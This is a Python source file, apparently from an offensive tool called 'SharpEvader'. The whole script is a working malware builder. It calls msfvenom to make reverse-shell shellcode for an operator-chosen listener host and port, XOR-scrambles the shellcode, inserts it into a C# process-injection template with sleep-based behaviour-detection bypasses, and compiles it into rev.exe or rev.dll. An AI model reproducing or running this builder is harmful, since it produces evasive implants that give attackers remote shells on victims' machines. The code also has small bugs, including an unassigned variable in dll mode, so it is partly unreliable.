import os
import yaml
import logging
import subprocess


from helpers.log import logger
from helpers.args import generate_cli_args
from helpers.generate_csharp_payload import generate_csharp_payload

# Shellcode Scramblers
from shellcode_scrambler.xor_encryptor import xor_encryptor



# Generate the msfvenom shellcode and put it in the /tmp/sharpevader_tmp/msf_shellcode.hex
def generate_msfvenom_payload():
    # Checking the availability of the /tmp/sharpevader_tmp/ directory and if not available then give birth to it
    if not os.path.isdir("/tmp/sharpevader_tmp"):
        logging.debug(f"The /tmp/sharpevader_tcp/ is not present, creating the directory")
        subprocess.run("mkdir /tmp/sharpevader_tmp".split(), stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
    
    # Generating the msfvenom payload in the /tmp/tmp_sharpevader/ directory in hex format
    logger.debug("Generating payload with msfvenom...")
    op = subprocess.run(f"msfvenom -p {args.p} LHOST={args.lh} LPORT={args.lp} -f hex -o /tmp/sharpevader_tmp/msf_shellcode.hex".split(), stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
    if op.returncode != 0:
        logger.error(f"msfvenom failed : \n{op.stdout.decode()}")
        exit()
    logger.debug(f"msfvenom command output : \n{op}")



# This would read the /tmp/sharpevader_tmp/msf_shellcode.hex shellcode and convert it into an integer shellcode
def read_and_convert_shellcode():
    with open("/tmp/sharpevader_tmp/msf_shellcode.hex","r") as msf_hex_shellcode:
        hex_shellcode = msf_hex_shellcode.read()
    integer_shellcode = [int(hex_shellcode[i:i+2],16) for i in range(0, len(hex_shellcode), 2)]
    
    return integer_shellcode

# Compiling the csharp code and placing it in the current working directory
def compile_csharp_code(mode="exe",nobin=False):
    logger.debug("Attempting to compile the C# File wth mono-mcs")
    if nobin:
        logger.debug("nobin flag found, The generated rev.exe or rev.dll would be placed in /tmp/sharpevader_tmp/ ")
        cwd = "/tmp/sharpevader_tmp"
    else:
        cwd = os.getcwd()
        logger.debug(f"Your rev.exe or rev.dll would be placed in {cwd}")
    if mode == "exe":
        
        op = subprocess.run(f"mcs -out:{cwd}/rev.exe /tmp/sharpevader_tmp/magisk.cs".split(), stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.decode()
        logger.debug(f"Mono mcs logs : \n{op}")
        logger.debug(f"Created {cwd}/rev.exe")
    elif mode == "dll":
        subprocess.run(f"mcs -target:library -out:{cwd}/rev.dll /tmp/sharpevader_tmp/magisk.cs".split(), stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.decode()
        logger.debug(f"Mono mcs logs : \n{op}")
        logger.debug(f"Created {cwd}/rev.dll")

# This is for cleaning up the temp directory created
def cleanup():
    # Checking if the /tmp/sharpevader_tcp exists, and if it does clear all files inside it
    if os.path.isdir("/tmp/sharpevader_tmp"):
        logging.debug("Found /tmp/sharpevader_tmp directory for cleanup")
        
        # This is a bit idiotic route as for the reason wildcards do not work with subprocess
        dir_path = "/tmp/sharpevader_tmp/"
        files = os.listdir(dir_path)
        for file in files:
            file_path = os.path.join(dir_path, file)
            subprocess.run(["rm", "-f", file_path])
        logging.debug("✅ Cleanup process complete")
    else:
        logger.debug("Temporary directory /tmp/sharpevader_tmp/ missing, Exiting without cleanup...")
    


def main():
    # Inserting the argparser arguments
    global args
    args = generate_cli_args()
    logger.setLevel(logging.ERROR)
    # Arguments check
    if args.v:
        logger.setLevel(logging.DEBUG)


    # Generating the msfvenom payload and placing it in the /tmp/sharpevader_tmp/msf_shellcode.hex
    generate_msfvenom_payload()

    # [RAW Shellcode]Read the shellcode as an integer and return it into this array
    integer_shellcode = read_and_convert_shellcode()
    scrambled_shellcode, key, decryption_routine_cs = xor_encryptor(integer_shellcode)


    # def generate_csharp_payload(template,shellcode,decryption_routine,behaviour_bypass,markers):
    script_path = os.path.dirname(os.path.abspath(__file__))
    with open(f"{script_path}/payloads/injection_templates/injection_template_marker.yaml","r") as f:
        injection_markers = yaml.load(f, Loader=yaml.SafeLoader)
    with open(f"{script_path}/payloads/injection_templates/process_injection.cs","r") as f:
        csharp_template = f.readlines()
    with open(f"{script_path}/payloads/behaviour_bypass/main.yaml","r") as f:
        behaviour_bypass = yaml.load(f, Loader=yaml.SafeLoader)

    # Generating the final csharp code with all the bypasses baked in
    final_csharp_template = generate_csharp_payload(csharp_template,scrambled_shellcode,decryption_routine_cs,behaviour_bypass["behaviour_detection_bypass"]["sleep_calls"],injection_markers["injection_markers"]["process_injection.cs"])

    # Writing the file in the /tmp/sharpevader_tmp/magisk.cs
    logger.debug(f"Writing the csharp file into /tmp/sharpevader_tmp/magisk.cs")
    with open("/tmp/sharpevader_tmp/magisk.cs","w") as f:
        final_csharp_code = "".join(final_csharp_template)
        f.write(final_csharp_code)
    
    if args.dll:
        mode = "dll"
    else:
        mode = "exe"
    
    # Compiling the csharp code
    compile_csharp_code(mode=mode,nobin=args.nobin)

    # Cleaning up the /tmp directory
    cleanup()

# The main function
if __name__ == '__main__':
    main()